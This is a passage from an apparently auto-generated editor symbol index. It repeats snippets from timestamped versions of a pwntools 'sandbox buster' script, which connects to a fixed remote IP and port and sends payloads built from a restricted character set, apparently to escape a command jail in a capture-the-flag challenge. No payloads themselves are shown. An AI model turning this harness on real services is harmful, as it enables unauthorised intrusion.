        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515213716",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213716",
        "description": ".history.sandbox_buster_20250515213716",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515213716",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213716",
        "description": ".history.sandbox_buster_20250515213716",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515213716",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515213716",
        "description": ".history.sandbox_buster_20250515213716",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515213716",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515215324",
        "description": ".history.sandbox_buster_20250515215324",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515215324",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515215324",
        "description": ".history.sandbox_buster_20250515215324",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515215324",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515215324",
        "description": ".history.sandbox_buster_20250515215324",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515215324",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515215324",
        "description": ".history.sandbox_buster_20250515215324",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515215324",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515215324",
        "description": ".history.sandbox_buster_20250515215324",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515215324",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515215324",
        "description": ".history.sandbox_buster_20250515215324",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515215324",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515215650",
        "description": ".history.sandbox_buster_20250515215650",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515215650",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515215650",
        "description": ".history.sandbox_buster_20250515215650",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515215650",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515215650",
        "description": ".history.sandbox_buster_20250515215650",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515215650",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515215650",
        "description": ".history.sandbox_buster_20250515215650",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515215650",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515215650",
        "description": ".history.sandbox_buster_20250515215650",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515215650",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515215650",
        "description": ".history.sandbox_buster_20250515215650",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515215650",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515220657",
        "description": ".history.sandbox_buster_20250515220657",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515220657",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515220657",
        "description": ".history.sandbox_buster_20250515220657",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515220657",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515220657",
        "description": ".history.sandbox_buster_20250515220657",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515220657",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515220657",
        "description": ".history.sandbox_buster_20250515220657",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515220657",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515220657",
        "description": ".history.sandbox_buster_20250515220657",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515220657",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515220657",
        "description": ".history.sandbox_buster_20250515220657",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515220657",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515221007",
        "description": ".history.sandbox_buster_20250515221007",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515221007",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515221007",
        "description": ".history.sandbox_buster_20250515221007",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515221007",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515221007",
        "description": ".history.sandbox_buster_20250515221007",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515221007",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515221007",
        "description": ".history.sandbox_buster_20250515221007",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515221007",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515221007",
        "description": ".history.sandbox_buster_20250515221007",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515221007",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515221007",
        "description": ".history.sandbox_buster_20250515221007",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515221007",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515221825",
        "description": ".history.sandbox_buster_20250515221825",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515221825",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515221825",
        "description": ".history.sandbox_buster_20250515221825",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515221825",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515221825",
        "description": ".history.sandbox_buster_20250515221825",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515221825",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515221825",
        "description": ".history.sandbox_buster_20250515221825",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515221825",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515221825",
        "description": ".history.sandbox_buster_20250515221825",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515221825",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515221825",
        "description": ".history.sandbox_buster_20250515221825",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515221825",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222218",
        "description": ".history.sandbox_buster_20250515222218",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515222218",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222218",
        "description": ".history.sandbox_buster_20250515222218",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=5).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515222218",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222218",
        "description": ".history.sandbox_buster_20250515222218",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515222218",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222218",
        "description": ".history.sandbox_buster_20250515222218",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515222218",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222218",
        "description": ".history.sandbox_buster_20250515222218",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515222218",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222218",
        "description": ".history.sandbox_buster_20250515222218",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515222218",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222253",
        "description": ".history.sandbox_buster_20250515222253",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515222253",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222253",
        "description": ".history.sandbox_buster_20250515222253",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515222253",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222253",
        "description": ".history.sandbox_buster_20250515222253",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515222253",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222253",
        "description": ".history.sandbox_buster_20250515222253",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515222253",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222253",
        "description": ".history.sandbox_buster_20250515222253",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515222253",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222253",
        "description": ".history.sandbox_buster_20250515222253",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515222253",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222353",
        "description": ".history.sandbox_buster_20250515222353",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515222353",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222353",
        "description": ".history.sandbox_buster_20250515222353",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515222353",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222353",
        "description": ".history.sandbox_buster_20250515222353",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515222353",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222353",
        "description": ".history.sandbox_buster_20250515222353",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515222353",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222353",
        "description": ".history.sandbox_buster_20250515222353",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515222353",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222353",
        "description": ".history.sandbox_buster_20250515222353",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515222353",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222424",
        "description": ".history.sandbox_buster_20250515222424",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515222424",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
